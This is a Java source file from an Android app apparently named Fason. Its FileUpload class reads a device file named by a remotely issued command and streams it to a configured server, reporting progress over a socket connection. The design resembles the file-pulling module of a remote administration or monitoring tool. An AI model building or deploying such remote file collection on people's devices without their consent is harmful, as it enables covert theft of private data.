package com.fason.app.features.storage;

import android.os.Build;
import android.util.Base64;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import io.socket.client.Socket;

public final class FileUpload {
    private static final int CHUNK = 64 * 1024;
    private static final int CONNECT_TIMEOUT = 15_000;
    private static final int READ_TIMEOUT = 5 * 60_000;
    private static final long PROGRESS_EMIT_INTERVAL_MS = 500;
    private static final long MAX_FILE_SIZE = 100L * 1024 * 1024;
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();

    private FileUpload() {}
    public static void upload(String path, String cmdId) {
        exec.execute(() -> doUpload(path, cmdId));
    }

    private static void doUpload(String path, String cmdId) {
        if (path == null || path.isEmpty()) {
            sendError("No path", cmdId);
            return;
        }
        File file = FileManager.safeFile(path);
        if (file == null) {
            sendError("Invalid or forbidden path", cmdId);
            return;
        }
        if (!file.exists() || !file.canRead()) {
            sendError("Cannot read file", cmdId);
            return;
        }
        long fileSize = file.length();
        if (fileSize == 0) {
            sendError("Empty file", cmdId);
            return;
        }
        if (fileSize > MAX_FILE_SIZE) {
            sendError("File too large (>100MB)", cmdId);
            return;
        }
        Socket socket = SocketClient.getInstance().getSocket();
        String transferId = Long.toHexString(System.currentTimeMillis()) + "_" +
            Integer.toHexString((int) (Math.random() * 0xFFFF));
        emit(socket, event("start", transferId, file.getName(), fileSize, 0, null), cmdId);
        HttpURLConnection conn = null;
        try {
            String boundary = "fason-" + java.util.UUID.randomUUID().toString();
            String serverUrl = getServerUrl();
            if (serverUrl == null) {
                sendError("Server URL not configured", cmdId);
                return;
            }
            String qs = "clientId=" + enc(getClientId()) +
                        "&cmdId=" + enc(cmdId != null ? cmdId : "") +
                        "&name=" + enc(file.getName()) +
                        "&size=" + fileSize;
            String token = getDeviceSecret();
            URL url = new URL(serverUrl + "/api/files/upload?" + qs);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            if (token != null && !token.isEmpty()) {
                conn.setRequestProperty("X-Device-Token", token);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                conn.setFixedLengthStreamingMode(fileSize);
            } else {
                conn.setFixedLengthStreamingMode((int) Math.min(fileSize, Integer.MAX_VALUE));
            }
            OutputStream os = conn.getOutputStream();
            try {
                writeMultipartHeader(os, boundary, "file", file.getName(), "application/octet-stream");
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buf = new byte[CHUNK];
                    int read;
                    long sent = 0;
                    long lastEmit = 0;
                    while ((read = fis.read(buf)) > 0) {
                        os.write(buf, 0, read);
                        sent += read;
                        long now = System.currentTimeMillis();
                        if (now - lastEmit > PROGRESS_EMIT_INTERVAL_MS) {
                            int pct = (int) (sent * 100 / fileSize);
                            emit(socket, event("progress", transferId, file.getName(), fileSize, sent, pct), cmdId);
                            lastEmit = now;
                        }
                    }
                }
                emit(socket, event("progress", transferId, file.getName(), fileSize, fileSize, 100), cmdId);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
                os.flush();
                int code = conn.getResponseCode();
                if (code == 200 || code == 201) {
                    emit(socket, event("end", transferId, file.getName(), fileSize, fileSize, null), cmdId);
                } else {
                    sendError("Server rejected upload: HTTP " + code + " " + readError(conn), cmdId);
                }
            } finally {
                try { os.close(); } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            sendError("Upload failed: " + e.getMessage(), cmdId);
        } finally {
            if (conn != null) try { conn.disconnect(); } catch (Exception ignored) {}
        }
    }
    private static void writeMultipartHeader(OutputStream os, String boundary, String fieldName,
                                             String fileName, String contentType) throws Exception {
        String safeName = fileName != null ? fileName : "file";
        safeName = safeName.replaceAll("[\r\n]", "").replace("\"", "\\\"");
        StringBuilder sb = new StringBuilder();
        sb.append("--").append(boundary).append("\r\n");
        sb.append("Content-Disposition: form-data; name=\"").append(fieldName).append("\"; filename=\"")
          .append(safeName).append("\"\r\n");
        sb.append("Content-Type: ").append(contentType).append("\r\n\r\n");
        os.write(sb.toString().getBytes(StandardCharsets.UTF_8));
    }

    private static String readError(HttpURLConnection conn) {
        try (java.io.InputStream es = conn.getErrorStream()) {
            if (es == null) return "";
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int n;
            while ((n = es.read(buf)) > 0 && bos.size() < 65536) {
                bos.write(buf, 0, n);
            }
            return bos.toString("UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    private static String getServerUrl() {
        try {
            return com.fason.app.core.config.Config.getServerUrl().replaceAll("/+$", "");
        } catch (Exception e) {
            return null;
        }
    }

    private static String getDeviceSecret() {
        try {
            return com.fason.app.core.config.Config.getDeviceSecret();
        } catch (Exception e) {
            return null;
        }
    }

    private static String getClientId() {
        try {
            return android.provider.Settings.Secure.getString(
                FasonApp.getContext().getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "unknown";
        }
    }

    private static String enc(String s) {
        try {
            return URLEncoder.encode(s != null ? s : "", StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return s != null ? s : "";
        }
    }
    private static JSONObject event(String stage, String transferId, String name,
                                    long total, long sent, Integer pct) {
        try {
            JSONObject o = new JSONObject();
            o.put("type", "upload_" + stage);
            o.put(Protocol.KEY_TRANSFER_ID, transferId);
            o.put(Protocol.KEY_NAME, name);
            o.put(Protocol.KEY_TOTAL_SIZE, total);
            o.put(Protocol.KEY_SIZE, sent);
            if (pct != null) o.put("progress", pct);
            return o;
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    private static void emit(Socket socket, JSONObject data, String cmdId) {
        if (socket == null) return;
        try {
            if (cmdId != null && !cmdId.isEmpty()) data.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.FILES, data);
        } catch (Exception ignored) {}
    }

    private static void sendError(String msg, String cmdId) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_TYPE, Protocol.TYPE_ERROR);
            err.put(Protocol.KEY_ERROR, msg);
            if (cmdId != null && !cmdId.isEmpty()) err.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.FILES, err);
        } catch (Exception ignored) {}
    }
}
